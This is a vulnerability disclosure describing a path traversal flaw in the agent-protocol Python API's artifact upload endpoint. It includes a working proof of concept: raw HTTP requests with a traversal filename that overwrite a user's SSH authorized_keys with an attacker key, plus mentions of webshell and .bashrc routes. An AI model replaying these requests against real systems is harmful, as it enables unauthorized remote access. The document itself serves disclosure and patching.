---
layout: post
title:  "Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol"
date:  2024-04-10 10:31:06 +0800
categories: file-overwrite
---

## Name

> Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Description

The `{{url}}/ap/v1/agent/tasks/{{task_id}}/artifacts` endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the `filename` parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.


## Proof of Concept

In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the `authorized_keys` file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ....

We proof this vulnerability by logging into the `kali` user running the agent-protocol python API and checking that at this moment the `/home/kali/.ssh/authorized_keys` file does not exist.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
```

An attacker can now send the following request to the webserver. This request will upload the attacker's public RSA key to the `authorized_keys` file.

We start a simple server using example from [https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py](https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py):

```
from agent_protocol import Agent, Task, Step

async def task_handler(task: Task) -> None:
    print(f"task: {task.input}")
    await Agent.db.create_step(task.task_id, task.input)

async def step_handler(step: Step) -> Step:
    print(f"step: {step.input}")
    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
    step.output = step.input
    return step

Agent.setup_agent(task_handler, step_handler).start()
```
Start server:

```
python mimimal.py
```

Then, create a task and get taskid:

```
POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 61

{
    "input": "test"
}
```

Using taskid we created and upload `authorized_keys` file, set filename to `../../../../../../../../../home/kali/.ssh/authorized_keys`

```
POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
User-Agent: PostmanRuntime/7.37.0
Accept: */*
Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2368

----------------------------590741319467185743628097
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/javascript

ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
----------------------------590741319467185743628097--
```

The response indicates success with artifact file path.

```
HTTP/1.1 200 
Content-Length: 169
Connection: keep-alive
Content-Type: application/json
Date: Wed, 10 Apr 2024 06:38:25 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: hypercorn-h11

{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
```

We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.

```
kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
```


## Impact

This vulnerability can have severe consequences. This section will highlight some tangible impact.

Warning: this bug also affects [smol.ai](https://github.com/smol-ai/developer)

### SSH Access

On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.

### Web Servers

On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)


## Reference

[https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e](https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e)

## Occurrences

[https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58](https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58)
